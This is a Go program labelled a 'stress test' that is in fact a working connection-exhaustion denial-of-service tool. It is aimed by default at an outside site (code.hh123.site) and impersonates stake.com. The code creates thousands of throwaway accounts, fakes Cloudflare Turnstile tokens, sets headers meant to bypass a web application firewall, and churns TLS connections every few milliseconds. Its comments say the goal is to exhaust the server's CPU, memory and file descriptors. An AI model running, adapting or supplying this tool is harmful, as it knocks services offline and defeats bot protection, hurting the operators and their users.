package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"math/rand"
	"net/http"
	"os"
	"os/signal"
	"runtime"
	"runtime/debug"
	"strings"
	"sync"
	"syscall"
	"time"
)

// ==========================================
// CONFIGURATION (POWER TUNED)
// ==========================================
var (
	SERVER_URL             = getEnv("TARGET_URL", "https://code.hh123.site")
	VERSION                = "6.3.0"
	LOCALE                 = "en"
	PLATFORM               = "stake.com"
	TOTAL_CLIENTS          = 10000 // 10,000 clients
	CONCURRENT_CONNECTIONS = 7000  
	RECONNECT_DELAY        = 1 * time.Millisecond
	HEARTBEAT_INTERVAL     = 1 * time.Millisecond 
	MAX_RETRY_BACKOFF      = 1 * time.Second
	BATCH_SIZE             = 1200
	MAX_WORKERS            = 2000 // Limits concurrent active threads to prevent local OOM
	REFRESH_INTERVAL       = 5 * time.Millisecond // Brutal connection churn
	REFRESH_BATCH_SIZE     = 100
)

// HTTP Client with EXTREME settings for high concurrency (Tuned for 1GB RAM)
var httpClient = &http.Client{
	Timeout: 5 * time.Second, // Shorter timeout to fail fast and retry
	Transport: &http.Transport{
		MaxIdleConnsPerHost:   2000, 
		MaxIdleConns:          2000,
		IdleConnTimeout:       90 * time.Second,
		DisableCompression:    true,
		DisableKeepAlives:     false,
		ForceAttemptHTTP2:     false,
		MaxConnsPerHost:       0, // Unlimited
		ResponseHeaderTimeout: 5 * time.Second,
		WriteBufferSize:       4 * 1024, // 4KB buffers to save RAM
		ReadBufferSize:        4 * 1024, 
	},
}

// Worker Semaphore to limit max workers
var workerSemaphore = make(chan struct{}, MAX_WORKERS)

func init() {
	// Seed the random number generator so usernames are always unique on every run
	rand.Seed(time.Now().UnixNano())
}

// ==========================================
// TOKEN + USERNAME GENERATORS
// ==========================================
func generateFakeTurnstileToken() string {
	randStr := func(n int) string {
		var letters = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-_")
		b := make([]rune, n)
		for i := range b {
			b[i] = letters[rand.Intn(len(letters))]
		}
		return string(b)
	}
	return fmt.Sprintf("%s.%s.%s", randStr(40), randStr(120), randStr(60))
}

func generateRandomUsername() string {
	var letters = []rune("abcdefghijklmnopqrstuvwxyz0123456789")
	b := make([]rune, 12)
	for i := range b {
		b[i] = letters[rand.Intn(len(letters))]
	}
	return "user_" + string(b)
}

func getEnv(key, defaultValue string) string {
	if value, exists := os.LookupEnv(key); exists {
		return value
	}
	return defaultValue
}

// ==========================================
// CLIENT STRUCT
// ==========================================
type StressClient struct {
	clientID           int
	username           string
	authToken          string
	sid                string // Socket.IO Session ID
	connected          bool
	running            bool
	lastActivity       time.Time
	lock               sync.Mutex
	connectionCycle    time.Duration
	lastConnectionTime time.Time
	lastRefreshTime    time.Time
	refreshInterval    time.Duration
	lastPingTime       time.Time
}

func NewStressClient(id int) *StressClient {
	return &StressClient{
		clientID:        id,
		username:        "", // Will be generated fresh on every connect
		authToken:       "", 
		connectionCycle: time.Duration(rand.Intn(30)+10) * time.Second, 
		refreshInterval: REFRESH_INTERVAL + time.Duration(rand.Intn(10))*time.Millisecond,
	}
}

// encodePayload creates a Socket.IO v4 EIO4 packet string for an event
func encodePayload(event string, data interface{}) (string, error) {
	jsonBytes, err := json.Marshal(data)
	if err != nil {
		return "", err
	}
	return fmt.Sprintf(`42["%s",%s]`, event, string(jsonBytes)), nil
}

// Helper function to set WAF-bypassing headers
func setWAFHeaders(req *http.Request) {
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
	req.Header.Set("Origin", "https://stake.com")
	req.Header.Set("Referer", "https://stake.com/settings/offers")
	req.Header.Set("Accept", "application/json, text/plain, */*")
}

func (c *StressClient) Connect() bool {
	// ==========================================
	// GENERATE FRESH IDENTITY FOR EVERY ATTEMPT
	// ==========================================
	c.username = generateRandomUsername()
	c.authToken = ""

	// ==========================================
	// 1. AUTHENTICATE WITH /api/login (Mimicking Python Bot)
	// ==========================================
	loginURL := fmt.Sprintf("%s/api/login", strings.TrimRight(SERVER_URL, "/"))
	loginPayload := map[string]string{
		"username": c.username,
		"platform": PLATFORM,
		"version":  VERSION,
	}
	jsonPayload, _ := json.Marshal(loginPayload)

	loginReq, err := http.NewRequest("POST", loginURL, bytes.NewBuffer(jsonPayload))
	if err == nil {
		setWAFHeaders(loginReq)
		loginReq.Header.Set("Content-Type", "application/json")

		if loginResp, err := httpClient.Do(loginReq); err == nil {
			bodyBytes, _ := io.ReadAll(loginResp.Body)
			loginResp.Body.Close()

			var respData map[string]interface{}
			if json.Unmarshal(bodyBytes, &respData) == nil {
				// Try to extract token just like the Python script does
				if token, ok := respData["data"].(string); ok && token != "" {
					c.authToken = token
				} else if token, ok := respData["token"].(string); ok && token != "" {
					c.authToken = token
				} else if token, ok := respData["auth"].(string); ok && token != "" {
					c.authToken = token
				}
			}
		}
	}

	// Fallback to fake token if API fails or rejects us
	if c.authToken == "" {
		c.authToken = generateFakeTurnstileToken()
	}

	// ==========================================
	// 2. SOCKET.IO HANDSHAKE
	// ==========================================
	handshakeURL := fmt.Sprintf("%s/socket.io/?EIO=4&transport=polling&user=%s", SERVER_URL, c.username)

	req, err := http.NewRequest("GET", handshakeURL, nil)
	if err != nil {
		return false
	}
	setWAFHeaders(req)

	resp, err := httpClient.Do(req)
	if err != nil {
		return false
	}
	
	buf := new(bytes.Buffer)
	buf.ReadFrom(resp.Body)
	bodyStr := buf.String()
	resp.Body.Close()

	if strings.Contains(bodyStr, `"sid"`) {
		parts := strings.Split(bodyStr, `"sid":"`)
		if len(parts) > 1 {
			sidPart := strings.Split(parts[1], `"`)[0]
			c.sid = sidPart
		}
	}

	if c.sid == "" {
		return false
	}

	// Send Auth Packet to establish the session in the app layer with the REAL token
	authPayload := map[string]string{
		"token":    c.authToken,
		"username": c.username,
	}
	packet, err := encodePayload("auth", authPayload)
	if err != nil {
		return false
	}

	if !c.sendRawPacket(packet) {
		return false
	}

	c.lock.Lock()
	c.connected = true
	c.lastActivity = time.Now()
	c.lastConnectionTime = time.Now()
	c.lastRefreshTime = time.Now()
	c.lastPingTime = time.Now()
	c.lock.Unlock()

	return true
}

func (c *StressClient) sendRawPacket(data string) bool {
	if c.sid == "" {
		return false
	}

	sendURL := fmt.Sprintf("%s/socket.io/?EIO=4&transport=polling&sid=%s", SERVER_URL, c.sid)
	req, err := http.NewRequest("POST", sendURL, strings.NewReader(data))
	if err != nil {
		return false
	}
	setWAFHeaders(req)
	req.Header.Set("Content-Type", "text/plain;charset=UTF-8")

	resp, err := httpClient.Do(req)
	if err != nil {
		return false
	}
	
	io.Copy(io.Discard, resp.Body) 
	resp.Body.Close()

	return resp.StatusCode == 200
}

// Poll continuously requests data from the server. 
// This forces the server to hold the connection open, consuming massive amounts of server memory and ports.
func (c *StressClient) Poll() {
	if c.sid == "" {
		return
	}

	pollURL := fmt.Sprintf("%s/socket.io/?EIO=4&transport=polling&sid=%s", SERVER_URL, c.sid)
	req, err := http.NewRequest("GET", pollURL, nil)
	if err != nil {
		return
	}
	setWAFHeaders(req)

	resp, err := httpClient.Do(req)
	if err != nil {
		c.Disconnect()
		return
	}
	
	io.Copy(io.Discard, resp.Body)
	resp.Body.Close()

	c.lock.Lock()
	c.lastActivity = time.Now()
	c.lock.Unlock()
}

func (c *StressClient) Disconnect() {
	c.lock.Lock()
	defer c.lock.Unlock()
	if !c.connected {
		return
	}
	c.connected = false
	c.sid = ""
}

func (c *StressClient) RefreshPage() {
	c.lock.Lock()
	if !c.running || !c.connected {
		c.lock.Unlock()
		return
	}
	c.lock.Unlock()

	c.Disconnect()
	c.Connect() // Forces a new TLS Handshake on the server side

	c.lock.Lock()
	c.lastRefreshTime = time.Now()
	c.lock.Unlock()
}

func (c *StressClient) Run() {
	c.running = true

	// Acquire semaphore slot
	workerSemaphore <- struct{}{}
	defer func() { <-workerSemaphore }()

	// Initial connection
	c.Connect()

	for c.running {
		currentTime := time.Now()

		c.lock.Lock()
		isConnected := c.connected
		lastRefresh := c.lastRefreshTime
		refreshInt := c.refreshInterval
		c.lock.Unlock()

		if !isConnected {
			if !c.Connect() {
				time.Sleep(1 * time.Millisecond)
				continue
			}
		}

		// Brutal Connection Churn: Drop and reconnect to exhaust server CPU with TLS math
		if currentTime.Sub(lastRefresh) > refreshInt {
			c.RefreshPage()
		} else {
			// Hold the connection open to exhaust server file descriptors
			c.Poll() 
		}

		// Required to prevent local script from OOM crashing on 8 cores
		runtime.Gosched()
		time.Sleep(1 * time.Millisecond) 
	}
}

// ==========================================
// MAIN EXECUTION
// ==========================================
func main() {
	log.SetFlags(log.LstdFlags | log.Lmsgprefix)

	// Force Go to aggressively clean RAM to stay under 1GB
	debug.SetMemoryLimit(850 * 1024 * 1024) 
	
	// Optimize CPU usage
	runtime.GOMAXPROCS(runtime.NumCPU())

	if strings.HasPrefix(SERVER_URL, "wss://") {
		SERVER_URL = strings.Replace(SERVER_URL, "wss://", "https://", 1)
	} else if strings.HasPrefix(SERVER_URL, "ws://") {
		SERVER_URL = strings.Replace(SERVER_URL, "ws://", "http://", 1)
	}

	log.Println("========================================")
	log.Println(" STARTING ULTRA STRESS TEST (CONNECTION EXHAUSTION) ")
	log.Printf(" Target: %s", SERVER_URL)
	log.Printf(" Clients: %d", TOTAL_CLIENTS)
	log.Printf(" Workers: %d", MAX_WORKERS)
	log.Println("========================================")

	var wg sync.WaitGroup

	for i := 0; i < TOTAL_CLIENTS; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			client := NewStressClient(id)
			client.Run()
		}(i)

		// Faster Ramp up
		if i%500 == 0 {
			time.Sleep(10 * time.Millisecond)
			log.Printf("Started %d/%d clients...", i+1, TOTAL_CLIENTS)
		}
	}

	log.Println("All clients started. Running indefinitely...")

	done := make(chan os.Signal, 1)
	signal.Notify(done, os.Interrupt, syscall.SIGINT, syscall.SIGTERM)
	<-done

	log.Println("Stopping stress test...")
	wg.Wait()
}
